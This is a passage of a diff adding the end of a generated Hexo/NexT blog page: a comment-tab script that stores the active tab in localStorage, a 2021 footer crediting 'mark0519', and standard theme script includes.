+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mark0519</span>
+</div> <!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div> -->
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
